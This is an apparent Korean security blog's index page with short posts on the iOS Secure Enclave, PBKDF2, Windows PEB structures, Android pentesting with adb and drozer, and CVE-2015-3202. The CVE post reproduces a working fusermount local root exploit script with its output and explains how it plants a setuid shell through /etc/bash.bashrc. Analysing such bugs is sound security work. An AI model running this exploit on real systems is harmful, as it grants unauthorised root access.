
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>KC's blog</title>
  <meta name="author" content="KC">

  
  <meta name="description" content="iOS Security Guide - iOS 8.3 or later Apple Watch 가 나오면서 저 문서가 update 되었다. Apple Shoots, Scores in Security. Quietly. Secure Enclave 우선 ROM 에 Apple &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://zomo.heroku.com/posts/8/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="KC's blog" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">KC's blog</a></h1>
  
    <h2>A blogging framework for hackers.</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="zomo.heroku.com">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/24/ios-security-guide-ios-8-dot-3-or-later/">iOS Security Guide - iOS 8.3 or Later</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-24T14:07:16+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:07 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="https://www.apple.com/business/docs/iOS_Security_Guide.pdf">iOS Security Guide - iOS 8.3 or later</a></p>

<p>Apple Watch 가 나오면서 저 문서가 update 되었다.</p>

<ul>
<li><a href="http://fromsiliconvalley.com/tag/secure-enclave/">Apple Shoots, Scores in Security. Quietly.</a></li>
</ul>


<h3>Secure Enclave</h3>

<ul>
<li><p>우선 ROM 에 Apple Certificate 이 박혀있어서, 애플이 서명한 컨텐츠를 검증할 수 있는데, ROM 에 박혀있기 때문에,
손대는 것이 불가능.</p></li>
<li><p>아이폰에는 Secure Enclave 라는 암호 코프로세서가 존재하는데, 이 안에 디바이스마다 유니크한 256-bit UID 가
제작 과정에서 각인됨. 애플에 따르면 자기들도 기록해두지 않아서 모르고, 생산된 디바이스에서 UID 를 recover
하는 것은 불가능. 아무도 모르는 유니크한 256-bit 가 코프로세서 안에 존재하는 셈.</p></li>
<li><p>Secure Enclave 는 암호화 엔진을 가지고 있는데, 암호키를 만들때 유저가 입력한 패스워드에 UID 를 섞기
때문에 고성능 FPGA 를 이용한 딕셔너리 공격이 어렵게 된다. Enc(사전에 나오는 단어+UID, Key) 를 돌려야하는데,
UID 는 코프로세서 밖으로 추출이 불가능하기때문에, 해당 아이폰에서만 복호화가 가능한 구조. 패스워드와 UID 를 섞는 과정은 80ms 가 걸리도록 튜닝되어있음.</p></li>
</ul>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/24/implementing-a-pbkdf2-based-password-storage-scheme-for-firefox-os/">Implementing a PBKDF2-Based Password Storage Scheme for FireFox OS</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-24T13:39:40+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:39 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="https://timtaubert.de/blog/2015/05/implementing-a-pbkdf2-based-password-storage-scheme-for-firefox-os/">Implementing A PBKDF2-Based Password Storage Scheme for FireFox OS</a></p>

<h4>The Passcode Module</h4>

<h4>Make The Passcode Look &ldquo;Random&rdquo;</h4>

<h4>Choosing PBKDF2 Parameters</h4>

<h4>Do Not Hard-code Parameters</h4>

<h4>Storing a New Passcode</h4>

<h4>Verifying a Given Passcode</h4>

<h4>What About bcrypt or scrypt?</h4>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/24/peb/">PEB</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-24T12:43:54+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:43 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><ul>
<li>youmin3.egloos.com/1650047</li>
<li>anster.egloos.com/2128538</li>
</ul>


<h4>PEB &amp; TEB</h4>

<ul>
<li>EPROCESS (in kernel)</li>
<li><p>ETHREAD (in kernel)</p></li>
<li><p>KPROCESS(Process Control Block) in EPROCESS (in kernel)</p></li>
<li><p>KTHREAD(Thread Control Block) in ETHREAD (in kernel)</p></li>
<li><p>PEB (in user space)</p></li>
<li>TEB (in user space)</li>
</ul>


<h4>WinDbg</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dt _PEB
</span><span class='line'>
</span><span class='line'>kd&gt; dt _EPROCESS
</span><span class='line'>
</span><span class='line'>kd&gt; dt _KPROCESS
</span><span class='line'>
</span><span class='line'>kd&gt; dt -a -b _TEB
</span><span class='line'>
</span><span class='line'>kd&gt; dt _ETHREAD
</span><span class='line'>
</span><span class='line'>kd&gt; dt _KTHREAD
</span></code></pre></td></tr></table></div></figure>


<h4>GetCurrentProcessID</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; uf kernel32!GetCurrentProcessID
</span><span class='line'>
</span><span class='line'>kd&gt; uf kernel32!GetCurrentThreadID</span></code></pre></td></tr></table></div></figure>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/22/cve-2015-3202-fusermount/">CVE-2015-3202: Fusermount</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-22T23:07:55+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>22</span><span class='date-suffix'>nd</span>, <span class='date-year'>2015</span></span> <span class='time'>11:07 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Tavis Ormandy 가 데비안/우분투에서 root 를 얻는 버그를 공개했다.</p>

<p><a href="https://gist.github.com/taviso/ecb70eb12d461dd85cba">gist</a></p>

<p>Twitter 에 올릴라고 140 자로 압축한 exploit 을 풀어봤다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>z@ubuntu:~$ cat babo.sh
</span><span class='line'>echo "chmod 4755 /bin/sh" &gt; /tmp/babo
</span><span class='line'>chmod 755 /tmp/babo
</span><span class='line'>mkdir -p /tmp/babo\;/tmp/babo
</span><span class='line'>LIBMOUNT_MTAB=/etc/bash.bashrc _FUSE_COMMFD=0 fusermount /tmp/babo\;/tmp/babo</span></code></pre></td></tr></table></div></figure>


<p>이 간단한 스크립트를 실행해본다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>z@ubuntu:~$ ./babo.sh
</span><span class='line'>fusermount: failed to open /etc/fuse.conf: Permission denied
</span><span class='line'>sending file descriptor: Socket operation on non-socket
</span><span class='line'>z@ubuntu:~$ cat /etc/bash.bashrc
</span><span class='line'>/dev/fuse /tmp/.6960;/tmp/.6960 fuse rw,nosuid,nodev,user=z 0 0</span></code></pre></td></tr></table></div></figure>


<p>이제 관리자가 sudo 나 root login 하기를 기다린다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>z@ubuntu:~$ sudo -s
</span><span class='line'>bash: /dev/fuse: Permission denied
</span><span class='line'>root@ubuntu:~# exit
</span><span class='line'>exit
</span><span class='line'>z@ubuntu:~$ ls -lL /bin/sh
</span><span class='line'>-rwsr-xr-x 1 root root 121272 Feb 10    2014 /bin/sh
</span><span class='line'>z@ubuntu:~$</span></code></pre></td></tr></table></div></figure>


<p>저 스크립트를 돌리면</p>

<ol>
<li>fusermount 가 바보같이 /etc/bash.bashrc 에다가 마운트 테이블을 overwrite 하는데,</li>
<li>나중에 root 가 로그인할때 /etc/bash.bashrc 가 수행되면서, (sudo -s)</li>
<li>/tmp/.6960 이 수행되고</li>
<li>chmod 4755 /bin/sh 이 수행되면서</li>
<li>setuid 쉘이 만들어지는 결과</li>
</ol>


<p>가 나오는 것으로 보인다.</p>

<p>핵심은 1 번 버그인 것 같은데,</p>

<ol>
<li>fusermount 가 setuid 되어있다.</li>
<li>fusermount 가 /bin/mount 를 부를때 (setuid(geteuid()) 를 해서 ruid 를 0 를 만든다)</li>
<li>mount 는 root 가 불렀다고 착각한다. (fusermount 입장에서는 의도된 것이긴 하지만, mount 입장에서는 속은 것)</li>
<li>이제 mount 디버깅용 환경 변수가 먹힌다. (LIBMOUNT_MTAB)</li>
<li>이제 마운트 테이블로 어떤 화일이든 overwrite 할 수 있다.</li>
</ol>


<p>sudo 쳐주기를 기다려야한다는 점에서, 실전에서 유용성은 많이 떨어진다고 본다.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/21/some-android-books/">Some Android Books</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-21T00:43:52+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2015</span></span> <span class='time'>12:43 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h4>Bootstrapping</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>export PATH=$PATH:/path/to/sdk/tools/:/path/to/sdk/platform-tools/
</span><span class='line'>
</span><span class='line'># cd /usr/local/bin
</span><span class='line'># ln -s /path/to/binary
</span><span class='line'>
</span><span class='line'>$ sudo apt-get install openjdk-6-jdk
</span><span class='line'>
</span><span class='line'>A 64-bit system requires an additional installation of 32-bit packages needed by the SDK tools.
</span><span class='line'>You can install these on Ubuntu 13.04 upward by using
</span><span class='line'>
</span><span class='line'>$ sudo dpkg -add-architecture i386
</span><span class='line'>$ sudo apt-get update
</span><span class='line'>$ sudo apt-get install libncurses5:i386 libstdc++6:i386 zlib1g:i386
</span><span class='line'>
</span><span class='line'>Prior to that version of Ubuntu, you use the following command:
</span><span class='line'>
</span><span class='line'>$ sudo apt-get 
</span><span class='line'>
</span><span class='line'>$ android sdk
</span><span class='line'>
</span><span class='line'>$ android avd
</span><span class='line'>
</span><span class='line'>$ emulator -avd kitkat
</span><span class='line'>
</span><span class='line'>$ adb devices
</span><span class='line'>
</span><span class='line'>$ adb -s device_id shell
</span><span class='line'>
</span><span class='line'>$ nc localhost 5554
</span><span class='line'>Android Console: type 'help' for a list of commands
</span><span class='line'>OK
</span><span class='line'>help
</span><span class='line'>
</span><span class='line'>* Genymotion (http://www.genymotion.com/)
</span><span class='line'>* Virtualbox running Android x86 (http://www.android-x86.org)
</span><span class='line'>* Youwave (https://youwave.com)
</span><span class='line'>* WindowsAndroid (http://windowsandroid.en.softonic.com/)
</span><span class='line'>
</span><span class='line'>shell@android:/ $ ps
</span><span class='line'>USER        PID     PPID        VSIZE       RSS     WCHAN       PC          NAME
</span><span class='line'>
</span><span class='line'>shell@android:/ # ls -l /data/data
</span><span class='line'>...
</span><span class='line'>drwxr-x--x u0_a46   u0_a46      2014-04-10 10:41 com.amazingutils.batterysaver
</span><span class='line'>
</span><span class='line'>class Test
</span><span class='line'>{
</span><span class='line'>    public static void main(String[] args)
</span><span class='line'>    {
</span><span class='line'>        System.out.println("It works! :D");
</span><span class='line'>    }
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>$ javac Test.java
</span><span class='line'>$ dx -dex -output=test.jar Test.class
</span><span class='line'>
</span><span class='line'>$ adb push test.jar /data/local/tmp
</span><span class='line'>$ adb shell dalvikvm -cp /data/local/tmp/test.jar Test
</span><span class='line'>It works :D</span></code></pre></td></tr></table></div></figure>


<h4>Android Packages</h4>

<p>Android applications are distributed in the form of a zipped archive with the file
extension of .apk, which stands for Android Package. The official MIME-type of an
Android Package is application/vnd.android.package-archive. These packages
are nothing more than zip files containing the relevant compiled application code,
resources, and application metadata required to define a complete application.
According to Google&rsquo;s documentation at <a href="http://developer.android.com/tools/building/index.html,">http://developer.android.com/tools/building/index.html,</a>
an APK is packaged by performing the following taks:</p>

<ul>
<li>An SDK tool named aapt (Android Asset Packaging Tool) converts all the XML resource files included
in the application to a binary form. R.java is also produced by aapt to allow referencing of
resources from code.</li>
<li>A tool named aidl is used to convert any .aidl files to .java files containing a converted
representation of it using a standard Java interface.</li>
<li>All source code and converted output from aapt and aidl are compiled into .class files by
the Java 1.6 compiler. This requires the android.jar file for your desired API version to be
in the CLASSPATH environment variable.</li>
<li>The dx utility is used to convert the produced .class files and any third-party libraries into a single
classes.dex file.</li>
<li>All compiled resources, non-compiled resouces (such as images or additional executables), and
the application DEX file are used by the apkbuilder tool to package an APK file. More recent version of the
SDK have deprecated the standalone apkbuilder tool and included it as a class inside sdklib.jar.
The APK file is signed with a key using the jarsigner utility. It can either be signed by a default debug
key or if it is going to production, it can be signed with your generated release key.</li>
<li>If it is signed with a release key, the APK must be zip-aligned using the zipalign tool, which
ensures that the application resources are aligned optimally for the way that they will be loaded into memory.
The benefit of this is that the amount of RAM consumed when running the application is reduced.</li>
</ul>


<h4>Tools</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ adb install /path/to/yourapplication.apk
</span><span class='line'>$ adb shell pm
</span><span class='line'>$ python -m  SimpleHTTPServer
</span><span class='line'>
</span><span class='line'>$ adb devices
</span><span class='line'>$ adb shell
</span><span class='line'>$ adb shell &lt;command&gt;
</span><span class='line'>$ adb push /path/to/local/file /path/on/android/device
</span><span class='line'>$ adb pull /path/on/android/device /path/to/local/file
</span><span class='line'>$ adb forward tcp:&lt;local_port&gt; tcp:&lt;device_port&gt;
</span><span class='line'>$ adb logcat
</span><span class='line'>
</span><span class='line'>http://www.busybox.net/downloads/binaries/
</span><span class='line'>
</span><span class='line'>$ adb push busybox-armv71 /data/local/tmp
</span><span class='line'>shell@android:/ $ chmod 755 /data/local/tmp/busybox-armv71
</span><span class='line'>sheel@android:/ $ export PATH=$PATH:/data/loal/tmp
</span><span class='line'>
</span><span class='line'>shell@android:/ $ pm list packages
</span><span class='line'>shell@android:/ $ pm path &lt;package_name&gt;
</span><span class='line'>shell@android:/ $ pm install /path/to/apk
</span><span class='line'>shell@android:/ $ pm uninstall &lt;package_name&gt;
</span><span class='line'>shell@android:/ $ pm disable &lt;package_name&gt;
</span><span class='line'>shell@android:/ $ logcat
</span><span class='line'>shell@android:/ $ logcat -s tag
</span><span class='line'>
</span><span class='line'>shell@android:/ $ getprop
</span><span class='line'>shell@android:/ $ dumpsys
</span><span class='line'>shell@android:/ $ service list</span></code></pre></td></tr></table></div></figure>


<h4>Drozer</h4>

<p><a href="https://www.mwrinfosecurity.com/products/drozer/community-edition/">Drozer</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ adb install agent.apk
</span><span class='line'>$ adb forward tcp:31415 tcp:31415
</span><span class='line'>$ drozer console connect
</span><span class='line'>
</span><span class='line'>dz&gt; list package
</span><span class='line'>dz&gt; module search -d</span></code></pre></td></tr></table></div></figure>


<p><a href="https://github.com/mwrlabs/drozer-modules/">Drozer modules</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>app.activity
</span><span class='line'>app.broadcast
</span><span class='line'>app.package
</span><span class='line'>app.provider
</span><span class='line'>app.service
</span><span class='line'>auxiliary
</span><span class='line'>exploit.pilfer
</span><span class='line'>exploit.root
</span><span class='line'>information
</span><span class='line'>scanner
</span><span class='line'>shell
</span><span class='line'>tools.file
</span><span class='line'>tools.setup</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dz&gt; shell
</span><span class='line'>u0_a59@android:/data/data/com.mwr.dz $ id
</span><span class='line'>
</span><span class='line'>dz&gt; run app.package.info -a com.mwr.dz -h
</span><span class='line'>
</span><span class='line'>dz&gt; run app.package.info -a com.mwr.dz &gt; /path/to/output.txt</span></code></pre></td></tr></table></div></figure>


<h4>Retrieving APK Files</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ adb shell pm list packages | grep twitter
</span><span class='line'>package:com.twitter.android</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dz&gt; run app.package.list -f "Terminal Emulator"
</span><span class='line'>jackpal.androidterm (Terminal Emulator)</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ adb shell pm path jackpal.androidterm
</span><span class='line'>package:/data/app/jackpal.androidterm-2.apk</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dz&gt; run app.package.info -a jackpal.androidterm
</span><span class='line'>Package: jackpal.androidterm
</span><span class='line'>  Application Label: Terminal Emulator
</span><span class='line'>  Process Name: jackpal.androidterm
</span><span class='line'>  Version: 1.0.59
</span><span class='line'>  Data Directory: /data/data/jackpal.androidterm
</span><span class='line'>  APK Path: /data/app/jackpal.androidterm-2.apk
</span><span class='line'>  UID: 10215
</span><span class='line'>  GID: [3003, 1015, 1023, 1028]
</span><span class='line'>  Shared Libraries: null
</span><span class='line'>  Shared User ID: null
</span><span class='line'>  Uses Permissions:
</span><span class='line'>  - android.permission.INTERNET
</span><span class='line'>  ...</span></code></pre></td></tr></table></div></figure>


<ul>
<li><a href="http://apkleecher.com">http://apkleecher.com</a></li>
<li><a href="http://apps.evozi.com/apk-downloader">http://apps.evozi.com/apk-downloader</a></li>
</ul>


<h4>Viewing Manifests</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ aapt dump xmltree /path/to/agent.apk AndroidManifest.xml
</span><span class='line'>
</span><span class='line'>$ aapt l -a /path/to/agent.apk
</span><span class='line'>
</span><span class='line'>$ unzip agent.apk
</span><span class='line'>
</span><span class='line'>$ java -jar AXMLPrinter2.jar AndroidManifest.xml
</span><span class='line'>&lt;?xml version="1.0" encoding="utf-8"?&gt;
</span><span class='line'>&lt;manifest
</span><span class='line'>    xmlns:android="http://schemas.android.com/apk/res/android"
</span><span class='line'>    android:versionCode="5"
</span><span class='line'>    android:versionName="2.3.4"
</span><span class='line'>    package="com.mwr.dz"&gt;
</span><span class='line'>    &lt;uses-sdk android:minSdkVersion="7" android:targetSdkVersion="18"&gt;
</span><span class='line'>    &lt;/uses-sdk&gt;
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>dz&gt; run app.package.manifest com.mwr.dz
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<h4>Activity &amp; Contenet Provider</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dz&gt; run app.activity.start --action android.intent.action.VIEW --data-uri http://www.google.com --component com.android.browser com.android.browser.BrowserActivity
</span><span class='line'>
</span><span class='line'>dz&gt; run app.provider.query content://settings/system</span></code></pre></td></tr></table></div></figure>


<h4>Permissions</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dz&gt; run app.package.info -a com.android.browser
</span><span class='line'>Package: com.android.browser
</span><span class='line'>Application Label: Browser
</span><span class='line'>Process Name: com.android.browser
</span><span class='line'>Version: 4.4.2-938007
</span><span class='line'>Data Directory: /data/data/com.android.browser
</span><span class='line'>APK Path: /system/app/Browser.apk
</span><span class='line'>UID: 10014
</span><span class='line'>GID: [3003, 1028, 1015]
</span><span class='line'>Shared Libraries: null
</span><span class='line'>Shared User ID: null
</span><span class='line'>Users Permissions:
</span><span class='line'>- android.permission.ACCESS_COARSE_LOCATION
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>dz&gt; run app.package.list -p android.permission.READ_SMS
</span><span class='line'>com.android.phone (Phone)
</span><span class='line'>com.android.mms (Messaging)
</span><span class='line'>com.android.gallery (Camera)
</span><span class='line'>com.android.camera (Camera)
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>dz&gt; run app.provider.info -p android.permission.READ_SMS
</span><span class='line'>Package: com.android.mms
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<h4>Protection Levels</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ drozer agent build --permission android.permission.INSTALL_PACKAGES
</span><span class='line'>Done: /tmp/tmp2RdLTd/agent.apk
</span><span class='line'>
</span><span class='line'>$ adb install /tmp/tmp/2RdLTd/agent.apk
</span><span class='line'>2312 KB/s (653054 bytes in 0.275s)
</span><span class='line'>     pkg: /data/local/tmp/agent.apk
</span><span class='line'>Success
</span><span class='line'>
</span><span class='line'>$ adb logcat
</span><span class='line'>...
</span><span class='line'>W/PackageManager(  373): Not granting permission
</span><span class='line'>android.permission.INSTALL_PACKAGES to package com.mwr.dz (protectionLevel=18 flags=0x83e46)
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>dz&gt; permissions
